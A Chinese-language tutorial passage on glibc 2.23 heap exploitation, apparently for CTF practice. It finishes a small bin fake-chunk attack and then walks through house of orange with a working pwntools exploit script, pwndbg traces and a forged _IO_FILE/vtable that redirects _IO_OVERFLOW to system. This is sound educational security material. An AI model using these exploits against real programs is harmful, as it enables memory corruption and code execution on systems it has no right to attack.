pwndbg> p/x victim
$1 = 0x9cf4140
pwndbg> p/x victim->bk
$2 = 0x4040c0
```

bck需要内存读写权限，这是其中利用的必要条件。接着跳过`if (__glibc_unlikely (bck->fd != victim))`条件。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3417
   3411         {
   3412           if (victim == 0) /* initialization check */
   3413             malloc_consolidate (av);
   3414           else
   3415             {
   3416               bck = victim->bk;
 ► 3417         if (__glibc_unlikely (bck->fd != victim))
   3418                 {
   3419                   errstr = "malloc(): smallbin double linked list corrupted";
   3420                   goto errout;
   3421                 }
   3422               set_inuse_bit_at_offset (victim, nb);
   3423               bin->bk = bck;
   3424               bck->fd = bin;
   
pwndbg> p/x bck->fd
$3 = 0x9cf4140
pwndbg> p/x victim
$4 = 0x9cf4140
```

提取0x9cf4140返回用户。这是接着申请chunks[6]，第二次进入small bin申请路径。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3405
   3399      hold one size each, no searching within bins is necessary.
   3400      (For a large request, we need to wait until unsorted chunks are
   3401      processed to find best fit. But for small ones, fits are exact
   3402      anyway, so we can check now, which is faster.)
   3403    */
   3404 
 ► 3405   if (in_smallbin_range (nb))
   3406     {
   3407       idx = smallbin_index (nb);
   3408       bin = bin_at (av, idx);
   
pwndbg> smallbins 
smallbins
0x100 [corrupted]
FD: 0x9cf4140 ◂— 0x4444444444444444 ('DDDDDDDD')
BK: 0x4040c0 (profile) —▸ 0x4040e0 (profile+32) ◂— 0
pwndbg> 
```

由于fake chunk1和fake chunk2的存在，顺利跳过校验。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3417
   3411         {
   3412           if (victim == 0) /* initialization check */
   3413             malloc_consolidate (av);
   3414           else
   3415             {
   3416               bck = victim->bk;
 ► 3417         if (__glibc_unlikely (bck->fd != victim))
   3418                 {
   3419                   errstr = "malloc(): smallbin double linked list corrupted";
   3420                   goto errout;
   3421                 }
   3422               set_inuse_bit_at_offset (victim, nb);
   3423               bin->bk = bck;
   3424               bck->fd = bin;
   
pwndbg> p/x bck
$5 = 0x4040e0
pwndbg> p/x bck->fd
$6 = 0x4040c0
pwndbg> p/x victim
$7 = 0x4040c0

pwndbg> x/14gx chunks 
0x404120 <chunks>:      0x0000000000000018      0x0000000009cf4010
0x404130 <chunks+16>:   0x00000000000000f8      0x0000000009cf4030
0x404140 <chunks+32>:   0x0000000000000018      0x0000000009cf4130
0x404150 <chunks+48>:   0x00000000000000f8      0x0000000009cf4150
0x404160 <chunks+64>:   0x00000000000003e8      0x0000000009cf4250
0x404170 <chunks+80>:   0x00000000000004b0      0x0000000009cf4640
0x404180 <chunks+96>:   0x00000000000000f8      0x00000000004040d0
pwndbg> 
```

可以发现顺利获取.bss上的0x00000000004040d0控制权，最终获取shell就轻车熟路了。


### 1-17 house of orange

本方法开创了Heap+IO利用的先河，在此感谢作者**4ngelboy**。主要思想：利用heap技术修改_IO_list_all为已知地址，并在该地址内伪造_IO_FILE_plus和_IO_jump_t结构，然后触发malloc_printerr或者涉及_IO_flush_all_lockp该函数的其它操作，最后触发伪造的函数指针。

```C

int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;

#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif

  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
	_IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
#endif
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)  <= target
	result = EOF;

      if (do_lock)
	_IO_funlockfile (fp);
      run_fp = NULL;

      if (last_stamp != _IO_list_all_stamp)
	{
	  /* Something was added to the list.  Start all over again.  */
	  fp = (_IO_FILE *) _IO_list_all;
	  last_stamp = _IO_list_all_stamp;
	}
      else
	fp = fp->_chain;
    }

#ifdef _IO_MTSAFE_IO
  if (do_lock)
    _IO_lock_unlock (list_all_lock);
  __libc_cleanup_region_end (0);
#endif

  return result;
}
```

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/11/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_orange/exploit.py)。

核心利用代码如下：

```python
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
conn.sendafter(b"Enter introduction: ", b"A" * 0x8)
# unsorted bin leak
malloc(0, 0x18, b"A" * 0x8)
malloc(1, 0xF8, b"B" * 0x8)
malloc(2, 0x18, b"C" * 0x8)
malloc(3, 0xF8, b"D" * 0x8)
malloc(4, (0x400 - 0x10), b"E" * 0x8)
delete(1)
delete(3)
author_name, introduction, content = show(1)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

# leak heap addr
edit(1, 0x8, b"A" * 0x8)
author_name, introduction, content = show(1)
chunk3_addr = u64(content[8 : 8 + 6].ljust(8, b"\x00"))
log.info(f"chunk3 addr: {hex(chunk3_addr)}")
edit(1, 0x8, p64(main_arena88))
malloc(1, 0xF8, b"B" * 0x8)
malloc(3, 0xF8, b"D" * 0x8)

# house of orange
payload = b"E" * (0x400 - 0x10) + b"E" * 0x8 + p64(0x9C1)
edit(4, len(payload), payload)
malloc(5, 0x1000, b"F" * 0x8)
payload = b"A" * (0x400 - 0x10) + b"/bin/sh\x00" + p64(0x61)
payload += p64(main_arena88) + p64(libc.sym["_IO_list_all"] - 0x10)
payload += p64(2) + p64(3)
payload += b"\x00" * 0x90 + p64(0)
payload += b"\x00" * 0x10 + p64(chunk3_addr)
edit(4, len(payload), payload)
payload = p64(0) + p64(libc.sym["system"])
edit(3, len(payload), payload)
conn.sendlineafter(b"> ", b"1")
conn.sendlineafter(b"Please input the chunk index: ", b"6")
conn.sendlineafter(b"Please input the size: ", b"16")
conn.recvline()
cmd = b"cat src/2.23/house_of_orange/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

首先利用unsorted bin leak泄露出来libc地址与heap地址，为后续的利用做好基础准备。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x58d634de3000
Size: 0x20 (with flag bits: 0x21)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x58d634de3020
Size: 0x100 (with flag bits: 0x101)
fd: 0x7de64b38db78
bk: 0x58d634de3140

Allocated chunk
Addr: 0x58d634de3120
Size: 0x20 (with flag bits: 0x20)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x58d634de3140
Size: 0x100 (with flag bits: 0x101)
fd: 0x58d634de3020
bk: 0x7de64b38db78

Allocated chunk
Addr: 0x58d634de3240
Size: 0x400 (with flag bits: 0x400)

Top chunk | PREV_INUSE
Addr: 0x58d634de3640
Size: 0x209c0 (with flag bits: 0x209c1)

pwndbg> unsortedbin 
unsortedbin
all: 0x58d634de3140 —▸ 0x58d634de3020 —▸ 0x7de64b38db78 (main_arena+88) ◂— 0x58d634de3140
pwndbg>
```

然后，修改top-chunk->size为p64(0x9C1)。

```bash
pwndbg> top-chunk 
Top chunk | PREV_INUSE
Addr: 0x58d634de3640
Size: 0x9c0 (with flag bits: 0x9c1)

pwndbg> 
```

接着申请chunks[5]，将old top释放至unsorted bin里。

```bash
pwndbg> top-chunk 
Top chunk | PREV_INUSE
Addr: 0x58d634e05010
Size: 0x20ff0 (with flag bits: 0x20ff1)

pwndbg> unsortedbin 
unsortedbin
all: 0x58d634de3640 —▸ 0x7de64b38db78 (main_arena+88) ◂— 0x58d634de3640
pwndbg> 
```

在0x58d634de3640中伪造_IO_FILE_plus结构。

```bash
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x58d634de3640 —▸ 0x7de64b38db78 (main_arena+88) ◂— 0x58d634de3640
BK: 0x58d634de3640 —▸ 0x7de64b38e530 ◂— 0
pwndbg> p/x *(struct _IO_FILE_plus*)0x58d634de3640
$1 = {
  file = {
    _flags = 0x6e69622f,
    _IO_read_ptr = 0x61,
    _IO_read_end = 0x7de64b38db78,
    _IO_read_base = 0x7de64b38e530,
    _IO_write_base = 0x2,
    _IO_write_ptr = 0x3,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x0,
    _offset = 0x0,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x0,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x58d634de3140
}
pwndbg> 
```

在chunks[3]里伪造_IO_jump_t结构。

```bash
pwndbg> p/x chunks[3]
$2 = {
  size = 0x10,
  addr = 0x58d634de3150
}
pwndbg> p/x *(struct _IO_jump_t*)(0x58d634de3150-0x10)
$3 = {
  __dummy = 0x0,
  __dummy2 = 0x101,
  __finish = 0x0,
  __overflow = 0x7de64b03c3eb,
  __underflow = 0x0,
  __uflow = 0x0,
  __pbackfail = 0x0,
  __xsputn = 0x0,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x0,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x0
}
pwndbg> 
```

任意申请一次内存，触发malloc_printerr调用。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3475
   3469       int iters = 0;
   3470       while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
   3471         {
   3472           bck = victim->bk;
   3473           if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
   3474               || __builtin_expect (victim->size > av->system_mem, 0))
 ► 3475             malloc_printerr (check_action, "malloc(): memory corruption",
   3476                              chunk2mem (victim), av);
```

进入_IO_flush_all_lockp函数内，触发`_IO_OVERFLOW (fp, EOF)`调用。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
```

### 未完待续...

## 参考

https://github.com/BinRacer/pwn4heap/tree/master/src/2.23
